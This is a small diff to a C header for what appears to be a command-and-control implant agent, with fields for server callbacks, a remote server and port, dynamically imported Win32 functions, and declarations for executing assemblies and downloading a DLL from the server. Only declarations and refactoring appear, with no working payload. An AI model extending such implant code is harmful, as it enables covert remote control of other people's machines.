@@ -8,6 +8,9 @@
 #define AGENT_REMOTE_SERVER_MAX_LENGTH 128
 #define AGENT_MAGIC 0x4145  // EA
 
+/*
+ * Interval in between agent callbacks in milliseconds.
+ */
 typedef DWORD AGENT_INTERVAL;
 
 /*
@@ -28,7 +31,7 @@ typedef struct Agent_ {
     AGENT_INTERVAL _interval;                             // the interval in between server callbacks
     WCHAR _remoteServer[AGENT_REMOTE_SERVER_MAX_LENGTH];  // the server IP or URL that the agent will connect to
     INTERNET_PORT _remotePort;                            // the port for the server 
-    PAPI api;                                             // the api that has dynamically imported Win32 functions
+    API api;                                              // the api that has dynamically imported Win32 functions
 } Agent, *PAgent;
 
 
@@ -325,8 +328,8 @@ BOOL _AgentExecuteShutdown(_In_ Agent* agent, _Out_ DLL* pEsgStdDll, _In_ Task t
  */
 BOOL _AgentExecuteAssembly(_In_ Agent* agent, PESG_STD_API pEsgStdApi, CHAR** pTaskResult, DWORD* pdwSizeOfOutput);
 
-void populate_api();
-PAPI inject_api();
+API _populate_api();
+VOID AGENT_downloadPrimalDll(Agent* agent, PDLL pPrimalDll);
 
 #endif // AGENT_H
 
